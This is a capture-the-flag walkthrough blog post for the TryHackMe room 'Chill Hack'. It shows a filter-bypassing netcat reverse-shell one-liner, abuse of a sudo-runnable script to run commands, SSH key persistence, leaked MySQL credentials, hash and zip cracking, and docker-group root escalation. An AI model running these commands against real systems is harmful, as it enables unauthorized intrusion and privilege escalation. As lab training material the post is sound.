---
layout: post
title:  "Chill Hack on Tryhackme"
date:   2020-11-24 12:00 +0200
description: "Walkthrough of Chill Hack on TryHackme"
tags: webenum script mysql docker
permalink: "/categories/:categories"
author: Zebra
image: /assets/img/thm-images/chillhack.png
categories: tryhackme chillhack
---

**[THM chillhack Link][thmlink]**  
# Chill Hack CTF WriteUp  
## by Zebra  
  
| Room        | Date        | Difficulty | Type         | Time | Own Intention | Machine  |
| ----------- | ----------- | ---------- | ------------ | ---- | ------------- | -------- |
| Chill Hack  | 30.11.2020  | Easy       | Challenge    | 2,0h | Easy -> Med.  | Linux    |
  
   
---
  
## <ins>Tasks</ins>  
  
| Task      | Question      |
| --------- | ------------- |
| Task 1.1  | User Flag     |
| Task 1.2  | Root Flag     |
  
  
  
--- 
  
  
## <ins>Introduction</ins>  
  
  
Hello and welcome to the write-up of the room “Chill Hack” on tryhackme.      
Chill Hack is a room marked as easy and in my opinion its also an easy to medium one.
We will start as always do with an nmap scan. The results show ssh, http and ftp running.
We start with checking out ftp with anonymous credentials. Only a little information there and
we head over to the web enumeration. We find a webpage called "Game Info". Our manual
and automated directory search with dirsearch bring us to an command execution php site.
But the command execution had some filters and we use a bypass to get a reverse shell.
On the system as www-data we escalate to use via a script by finding with sudo -l.
Run linpeas and enumerate the system by hand. We see some Ports running on localhost and 
do a ssh port forwarding to reach them. On the Site on Port 9001 we had a login mask working
with a mysql database. In the database we find credentials to login on the page and download a file.
The extracted files of the images give us the escalation to another user. This user is member
of the docker group, which give us the chance to escalate to root with the help of GTFObins.
   
  
**So let's begin:**     
  
  
  
---
  
  
  
## <ins>Preparation Steps</ins>  
  
> 
```bash	
mkdir chillhack    #New Room folder
cd chillhack       #Move into folder
mkdir nmap  	  #Nmap directory
mkdir web  #web enum directory
sudo nano /etc/hosts #$ip chillhack.thm
export target=10.10.10.10
export golist=/usr/share/seclists/Discovery/Web-Content/common.txt
export rockyou=/usr/share/wordlists/rockyou.txt
```  
  

---

  
    
# <ins>Scanning and Enumeration</ins>

Lets begin with a standard nmap scan for common ports. After that check all ports
for don't let a port pass out of our attention. 
  

## <ins>Nmap Scan</ins>
  
1. Nmap initial scan
2. Nmap all ports check
3. If necessary fire up a all port scan.


```sh
$nmap -sC -sV -oN ./nmap/initial chillhack.thm

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```  
  
#-sC = Scan with default NSE scripts.  
#-sV = Attempts to determine the version of the service running on port.  
#-oN = Normal output to the file.  
  
> The all port scan show nothing more.


| Port        | Service       | Information's                   |
| ----------- | -----------   | ------------------------------- | 
| 21/tcp      | ftp           | vsftpd 3.0.3, anonymous login  |
| 22/tcp      | ssh           | OpenSSH 7.6p1 Ubuntu            |
| 80/tcp      | http          | Golang net/http server          |
  
  
  
---
  

# <ins>FTP Enumeration</ins>
  
  
  
Login to ftp with the username "anonymous" and password "".
Download note.txt and cat it out.
  

  
```bash
ftp 10.10.162.212
Connected to 10.10.162.212.
220 (vsFTPd 3.0.3)
Name (10.10.162.212:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (24.2725 kB/s)
ftp> exit
221 Goodbye.

@local:
cat note.txt     
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
  

-> We have now information about a username "apaar" and a possible command execution.
   
  
  
---
  
  
# <ins>Web Enumeration</ins>  
  
  
## <ins>Visit web-pages Port 80:</ins>   
  
  
Firefox: `chillhack.thm` on Port 80  
  
For the manual enumeration we "hover" over the clickable buttons on the page and on the bottom left we could check
for new directories.  
We also start a web enumeration via [dirsearch](https://github.com/maurosoria/dirsearch).
    
---
     
    
## <ins>Web directory enumeration:</ins>
  
  
We could use one of our preferred tools like dirbuster, gobuster or dirsearch.
I will use dirsearch this time.


### <ins>Dirsearch scan:</ins>  
  
  
```sh
python3 dirsearch.py -u http://10.10.10.10 -e html,php,txt --plain-text-report=web/initial -x 403 --wordlist=/usr/share/wordlists/dirb/common.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: html, php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 4614


Target: http://10.10.10.10

[17:44:23] Starting: 
[17:44:25] 200 -   34KB - /
[17:44:49] 301 -  310B  - /css  ->  http://10.10.10.10./css/
[17:45:02] 301 -  312B  - /fonts  ->  http://10.10.10.10/fonts/
[17:45:09] 301 -  313B  - /images  ->  http://10.10.10.10/images/
[17:45:09] 200 -   34KB - /index.html
[17:45:12] 301 -  309B  - /js  ->  http://10.10.10.10/js/
[17:45:35] 301 -  313B  - /secret  ->  http://10.10.10.10/secret/

Task Completed

```
  
  
We start a second scan on `http://10.10.10.10/secret/` and a scan on http://10.10.10.10 with a medium list. But nothing more there.
  

---



  
## <ins>Visit web-page /secret:</ins> 

firefox: `http://10.10.10.10/secret`
  
We will find there a command execution window. In the source code we find nothing interesting.   
so we head over to run some commands.

## <ins>Command execution on /secret:</ins> 
  
When we enter commands like: 'nc', 'python', 'bash','php','cat'... (you can check the full list in /var/www/html/secret/index.php on the system) we get an imaged that with the question "Are you a hacker".  
Now we know that this will be the filters mentioned in the "notes.txt" file from the ftp server.
After some time i find commands that worked:

- pwd
- dir
- id, uname -a,
  
With this commands you could enumerate the system manual but the thing we will do is:   
**Get a reverse shell running.**
  


---
  

## <ins>Reverse shell:</ins>
  
  
I tried a lot of reverse shells of [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) but nothing worked.
  
So i started googling to find a way to bypass the filter.
  
With searches like `php command injection filter bypass` i find a github page, which i know and visite before.
Its [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) from "swisskyrep".
  
You find there some ways to bypass via `single quote`, `double quote` and `backslash` in the category "Bypass without spaces". I use the double quote one.  

So a combination of the bypass and a remote shell command give me the reverse shell:
  
@local (start listener):  
`rlwrap nc -lvnp 9001`

@secret:  
`r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <yourip> 9001 >/tmp/f`

We got the shell! 
  
  
  
---
  
  
  
# <ins>User escalation:</ins>
  
First we upload linpeas.sh for automated enumeration and start our own manual enumeration.
  
  
```bash
rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.11.19.12] from (UNKNOWN) [10.10.236.173] 46386

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

ls -la /home
total 20
drwxr-xr-x  5 root    root    4096 Oct  3 04:28 .
drwxr-xr-x 24 root    root    4096 Oct  3 03:33 ..
drwxr-x---  2 anurodh anurodh 4096 Oct  4 14:01 anurodh
drwxr-xr-x  5 apaar   apaar   4096 Oct  4 14:11 apaar
drwxr-x---  4 aurick  aurick  4096 Oct  3 05:33 aurick

cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

uname -a
Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

sudo -l
Matching Defaults entries for www-data on ubuntu:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

At this point we find something interesting with `sudo -l`. Its a script in apaar's home directory.
Check it out. 

```bash
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"

```
  

So this script print one welcome line and two lines with an input behind.
The first input will go to the variable `$person` and the second to `$msg`.  

The msg will be interesting cause it is directed to `2>/dev/null`. Perhaps we can
enter some commands. Check it with `id` first and then try to escalate with `/bin/bash`.
  
> To start the script we had to specify a user in our sudo command cause (apaar:ALL).
   
- Enter the person whom you want to talk with: test
- Hello user! I am $person,  Please enter your message: id
  

```bash
$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

test
test
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
```
  
Commands worked! Escalate:  
  
- Enter the person whom you want to talk with: escalate
- Hello user! I am $person,  Please enter your message: /bin/bash
  


```bash
sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

escalate
escalate
/bin/bash
/bin/bash
id
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
bash -i
bash -i
python3 -c 'import pty;pty.spawn("/bin/bash")'
apaar@ubuntu:/var/www/html/secret$
```
  


---
  
  
# <ins>Apaar enumeration --- User flag </ins> 


When i have a reverse shell or an escalation like this, i will try first to stabilize
with a ssh connection. Nmap show ssh is running and we in our www-data enumeration we see
that apaar has a folder called ".ssh" in his home directory. So we can put our key under authorized_keys.


```bash
@ local

ssh-keygen
Input a name if you want. (I choose apaar_rsa)
Check with enter

chmod 600 apaar_rsa

cat apaar_rsa.pub 
ssh-rsa some crazy strings thm@thm

@ victim
cd /home/apaar/.ssh
echo "<Output of cat apaar_rsa.pub>" > authorized_keys

@local

ssh -i apaar_rsa apaar@10.10.10.10
```
  

Now we have a stable connection for further steps.
In my case i use pwncat for system enumeration and file transfer.
  


```bash
cd pwncat folder
python3 -m venv pwncat-env
source pwncat-env/bin/activate
pwncat -i <apaar_rsa path> apaar@10.10.10.10

cd /tmp
ctrl + D
upload linpeas.sh
ctrl + D

chmod +x linpeas.sh
./linpeas.sh | tee lin.log

ctrl + D
download lin.log
run enumerate.gather
```
  

Try to find the user.txt. But with `locate user.txt` we get no hit. I decided to look for all txt files.
I find the flag in the home directory of apaar with `locate *.txt`.
  


###
**Task 1.1 solved**
###
  
  
---

## <ins>Analyze the lin.log:</ins>
  
- Cronjobs: Nothing
- Software: docker is interesting
- Network: Some Ports are listening, which nmap dont show: **9001,3306,53** [port_wiki](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)
- User: apaar anurodh (in docker group -> interesting!), aurick (lxd group)
- Files and folders: /var/www/files , /var/www/html
- Passwords: Perhaps credentials in /var/www/files/index.php
  


---
  
  

## <ins>Split into two Paths</ins>
  
The way to go to user and root escalation could go through two ways.  

Way 1:  
Check out the local port 9001 with Port forwarding and get the credentials from there.
    
Way 2:  
Check out directly the /var/www/ folder.
  
I will show both ways.
  
  
  
---
  
# <ins>Anurodh escalation:</ins>
  


## <ins>Way 1:</ins>
  


We found a listening port on 127.0.0.1:9001. When we see a listening port like this
on the localhost and had a stable ssh connection, we could forward the port to our system.
  
To do this use the following command @local:
  
```bash
ssh -L 9001:127.0.0.1:9001 -i apaar_rsa apaar@10.10.10.10

netstat -tulpn
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      6415/ssh
```
  
The port is forwarded to our local system and we could scan it with nmap:
  
```bash
nmap -sC -sV -p 9001 127.0.0.1             

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-30 17:59 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
  

Nmap shows that a webserver is running. So enter in firefox `127.0.0.1:9001`.  
You get directed to an "Costumer Portal" with a login mask. 
  
We had no valid credentials and standard inputs like admin:admin, admin:password
or root:root don't work.
  
From now on we get parallel with way 2.
  


---
  

## <ins>Way 2:</ins>

With linpeas output and the running webserver on port 9001 the /var/www path will be interesting.  
So lets have a look.

  
```bash
cd /var/www/
ls -la
total 16
drwxr-xr-x  4 root root 4096 Oct  3 04:01 .
drwxr-xr-x 14 root root 4096 Oct  3 03:44 ..
drwxr-xr-x  3 root root 4096 Oct  3 04:40 files
drwxr-xr-x  8 root root 4096 Oct  3 04:40 html

cd files/
ls -la
total 28
drwxr-xr-x 3 root root 4096 Oct  3 04:40 .
drwxr-xr-x 4 root root 4096 Oct  3 04:01 ..
-rw-r--r-- 1 root root  391 Oct  3 04:01 account.php
-rw-r--r-- 1 root root  453 Oct  3 04:02 hacker.php
drwxr-xr-x 2 root root 4096 Oct  3 06:30 images
-rw-r--r-- 1 root root 1153 Oct  3 04:02 index.php
-rw-r--r-- 1 root root  545 Oct  3 04:07 style.css

apaar@ubuntu:/var/www/files$ cat index.php 
<html>
<body>
<?php
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
?>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				<?php echo $success?>
                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```
  
  
  
The index.php in the /files/ folder will be our login mask on port 9001. The code of index.php
show us some credentials of an mysql database.
  
  
  
---
  
  
  
## <ins>MSQL enumeration</ins>
  
  
With the credentials of index.php we could get some useful information out of msql.
  
We has a username, password and database name. So connect to this.
  
```bash
mysql -u root -p webportal
  
SHOW TABLES;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)
  
mysql> SELECT * users;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'users' at line 1
mysql> SELECT * FROM users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | ******                           |
|  2 | Apaar     | Dahal    | cullapaar | ******                           |
+----+-----------+----------+-----------+----------------------------------+
```
  
  
Now we get two usernames and two passwords. Buth the passwords are not plane texted. Use `hash-identifier` to check it out.  
The two strings are md5 hashes. I crack this online on [crackstation](https://crackstation.net/).
  
With the credentials we could login on 127.0.0.1:9001 locally.
And we get directed to hacker.php.
  
  

---
  
  
    
## <ins>Anurodh credentials</ins> 
  
  
For the solution we don't have to go through msql cause the index.php show that if a login is successful
we get directed to the hacker.php.  

`cat hacker.php` -> There is an interesting image which could we download with pwncat or scp.    

`scp -i apaar_rsa apaar@10.10.10.10:/var/www/files/images/hacker-with-laptop_23-2147985341.jpg ./tmp`
  
@ local
`steghide extract -sf hacker-with-laptop_23-2147985341.jpg`

> no password
  
We get a encryped zip file. Use john for decryption.  
  
`zip2john backup.zip > hash` and `john hash --wordlist=/usr/share/wordlists/rockyou.txt`. Unzip with the password.  
  
We get a php file called source_code.php with a base64 hash. Decrypt the hash locally with:  
  
`echo "<hash>" | base64 -d`
  
We get the password for anurodh!
  
`su anurodh` and enter the password.
  
  

---
  

# <ins>Root escalation</ins>
  
We are now active as anurodh. Linpeas also look for SUIDs or capabilities but no hit. I also check `sudo -l` but nothing new.  
  
But our linpeas show us something interesting. The groups of anurodh. I checked it with `id` again and we are in the docker group.  
[GTFObins](https://gtfobins.github.io/gtfobins/docker/) will help us to escalte via docker so search for the way to go.  
  

```bash
anurodh@ubuntu:/var/www/files/images$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# python3 -c 'import pty;pty.spawn("/bin/bash")'
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@c8d010f269cc:/# cd /root
root@c8d010f269cc:~# ls -la
total 72
drwx------  6 root root  4096 Oct  4 14:13 .
drwxr-xr-x 24 root root  4096 Oct  3 03:33 ..
-rw-------  1 root root   129 Nov 30 17:47 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Oct  3 06:40 .cache
drwx------  3 root root  4096 Oct  3 05:37 .gnupg
-rw-------  1 root root   370 Oct  4 07:36 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root 12288 Oct  4 07:44 .proof.txt.swp
drwx------  2 root root  4096 Oct  3 03:40 .ssh
drwxr-xr-x  2 root root  4096 Oct  3 04:07 .vim
-rw-------  1 root root 11683 Oct  4 14:13 .viminfo
-rw-r--r--  1 root root   166 Oct  3 03:55 .wget-hsts
-rw-r--r--  1 root root  1385 Oct  4 07:42 proof.txt
root@c8d010f269cc:~# wc -l proof.txt 
32 proof.txt
```
  

###
**Task 1.2 solved**
###
  


<a href="https://www.c-ville.com/wp-content/uploads/2013/04/Root-the-box-660x335.jpg" rel="follow"><left><img src="/assets/img/thm-images/root.jpg" />  
  
  
   
---
  
  
# <ins>What we learned:</ins>

1. Analyzing php and sh files.
2. Get ssh running and foward a port to our localhost.
3. Connect to msql and go through tables.
4. Escalate via docker.





---  
  
[thmlink]: https://tryhackme.com/room/chillhack